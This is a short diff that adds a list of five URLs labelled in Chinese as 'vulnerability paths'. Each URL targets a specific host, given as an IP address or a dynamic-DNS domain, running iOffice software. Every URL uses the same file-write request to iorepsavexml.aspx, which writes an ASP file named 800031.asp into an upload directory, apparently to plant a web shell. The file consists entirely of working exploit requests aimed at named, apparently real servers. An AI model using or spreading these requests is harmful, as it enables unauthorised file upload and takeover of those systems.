@@ -1,0 +1,5 @@
+漏洞路径 http://121.12.249.165/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=800031.asp&filepath=/upfiles/rep/pic/
+漏洞路径 http://119.131.119.189:9000/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=800031.asp&filepath=/upfiles/rep/pic/
+漏洞路径 http://jmyybjl.gnway.org:88/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=800031.asp&filepath=/upfiles/rep/pic/
+漏洞路径 http://tk17379704.iask.in/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=800031.asp&filepath=/upfiles/rep/pic/
+漏洞路径 http://iphen.kmdns.net:9000/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=800031.asp&filepath=/upfiles/rep/pic/
